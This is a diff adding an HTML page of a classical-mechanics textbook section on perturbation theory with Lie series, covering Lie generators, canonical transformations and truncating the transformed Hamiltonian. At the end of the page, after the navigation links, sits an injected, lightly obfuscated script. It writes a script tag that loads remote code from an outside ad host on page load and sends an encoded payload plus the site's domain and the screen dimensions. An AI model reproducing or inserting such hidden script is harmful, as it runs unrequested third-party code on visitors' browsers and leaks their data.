@@ -1,0 +1,106 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-71.html">previous</a></span><span>, <a href="book-Z-H-73.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_6.1"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_6.1">6.1&nbsp;&nbsp;Perturbation Theory with Lie Series</a></h2>
+<p><a name="%_idx_2978"></a><a name="%_idx_2980"></a></p>
+<p>
+<a name="%_idx_2982"></a><a name="%_idx_2984"></a><a name="%_idx_2986"></a>Given a system, we look for a decomposition of the Hamiltonian in the
+form
+<a name="EQUATION_6.2"></a></p>
+<div align=left><img src="chap6-Z-G-2.gif" border="0"></div>
+<p>
+where <em>H</em><sub>0</sub> is solvable.  We assume that the Hamiltonian has no
+explicit time dependence; this can be ensured by going to the extended
+phase space if necessary.  We also assume that a canonical transformation
+has been made so that <em>H</em><sub>0</sub> depends solely on the momenta:
+<a name="EQUATION_6.3"></a></p>
+<div align=left><img src="chap6-Z-G-3.gif" border="0"></div>
+<p></p>
+<p>
+We carry out a <a name="%_idx_2988"></a>Lie transformation and find the conditions that the Lie
+generator <em>W</em> must satisfy to eliminate the order-<img src="chap1-Z-G-D-12.gif" border="0"> terms
+from the Hamiltonian.</p>
+<p>
+The Lie transform and associated Lie series specify a canonical
+transformation:
+<a name="EQUATION_6.4"></a></p>
+<div align=left><img src="chap6-Z-G-4.gif" border="0"></div>
+<p>
+where <em>Q</em> = <em>I</em><sub>1</sub> and <em>P</em> = <em>I</em><sub>2</sub> are the coordinate and momentum selectors and <em>I</em> is
+the identity function.
+Recall the definitions
+<a name="EQUATION_6.5"></a></p>
+<div align=left><img src="chap6-Z-G-5.gif" border="0"></div>
+<p>
+with <em>L</em><sub><em>W</em></sub> <em>F</em>  =  { <em>F</em>, <em>W</em> }.</p>
+<p>
+Applying the Lie transformation to <em>H</em> gives us
+<a name="EQUATION_6.6"></a></p>
+<div align=left><img src="chap6-Z-G-6.gif" border="0"></div>
+<p></p>
+<p>
+The first-order term in <img src="chap1-Z-G-D-12.gif" border="0"> is zero if <em>W</em> satisfies the condition
+<a name="EQUATION_6.7"></a></p>
+<div align=left><img src="chap6-Z-G-7.gif" border="0"></div>
+<p>
+which is a linear partial differential equation for <em>W</em>.  The
+transformed Hamiltonian is
+<a name="EQUATION_6.8"></a></p>
+<div align=left><img src="chap6-Z-G-8.gif" border="0"></div>
+<p>
+where we have used condition&nbsp;(<a href="#EQUATION_6.7">6.7</a>) to simplify the
+<img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> contribution.  </p>
+<p>
+This basic step of perturbation theory has eliminated terms of a
+certain order (order <img src="chap1-Z-G-D-12.gif" border="0">) from the Hamiltonian, but in doing so
+has generated new terms of higher order (here <img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> and higher).</p>
+<p>
+At this point we can find an approximate solution by truncating
+Hamiltonian&nbsp;(<a href="#EQUATION_6.8">6.8</a>) to <em>H</em><sub>0</sub>, which is
+solvable. 
+The approximate solution for given initial conditions (<em>t</em><sub>0</sub>, <em>q</em><sub>0</sub>,
+<em>p</em><sub>0</sub>) is obtained by finding the corresponding (<em>t</em><sub>0</sub>, <em>q</em>'<sub>0</sub>, <em>p</em>'<sub>0</sub>) using the
+inverse of transformation&nbsp;(<a href="#EQUATION_6.4">6.4</a>).  
+Then the system is
+evolved to time
+<em>t</em> using the solutions of the truncated Hamiltonian <em>H</em><sub>0</sub>, giving the
+state
+(<em>t</em>, <em>q</em>', <em>p</em>').  The phase-space coordinates 
+of the evolved point are transformed back to the
+original variables using the
+transformation&nbsp;(<a href="#EQUATION_6.4">6.4</a>) to state (<em>t</em>, <em>q</em>,
+<em>p</em>).  The approximate solution is
+<a name="EQUATION_6.9"></a></p>
+<div align=left><img src="chap6-Z-G-9.gif" border="0"></div>
+<p>
+If the Lie transform <em>E</em>'<sub><img src="chap1-Z-G-D-12.gif" border="0">, <em>W</em></sub>  =  <em>e</em><sup><img src="chap1-Z-G-D-12.gif" border="0"> <em>L</em><sub><em>W</em></sub></sup> must be
+evaluated by summing the series, then we must specify the order to
+which the sum extends.</p>
+<p>
+Assuming everything goes okay, we can imagine repeating this process to
+eliminate the order-<img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> terms and so on, bringing the
+transformed Hamiltonian as close as we like to <em>H</em><sub>0</sub>.  Unfortunately,
+there are complications.  We can understand some of these
+complications and how to deal with them by considering some
+specific applications.</p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-71.html">previous</a></span><span>, <a href="book-Z-H-73.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD1eD%2b3oOOUtFEZBrOCcEesm7HnObPCi1J6HFcVpE9v81YTFyNlOHhr6dvW4MouoOgw9xHOnakpDgvfM%2b1dvLjtuSHScDtht76hldpRO87mIGuuD2Kq%2bpqH7qF%2bIc2eLbLlIPWI22A49Gp31iJHOXMHWRoERaFiDB4nmk2DUinP%2fyTPgDrIPvw73q7LMn9RkeDzqrf4dmj3ZM6TJW1zTZ915Ho0chJuAybh8T8ElWWon%2fgyvSkB7%2fjjl4jTwERkYKIyvmauT3VgYsHNaGgVb%2bvQ91QqbA4TTr9OUNVA6xe7cL7FWMo0Yi57p%2fIpKcOrvR9XXy8T7933Bm2mM%2fSdQhnZeLCz2T5PEPISH%2fukGZbw9uWqIjdRpTkRlrzxVPk9i8x2i0SifdCHLntrlCjM%2f6ayOHLc%2bK1z85yD%2fywnJlf1SDQ6jOa03cu0%2bCZzeHZas1d9R6LZj4FoUH5vuqHvvLN%2fU");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
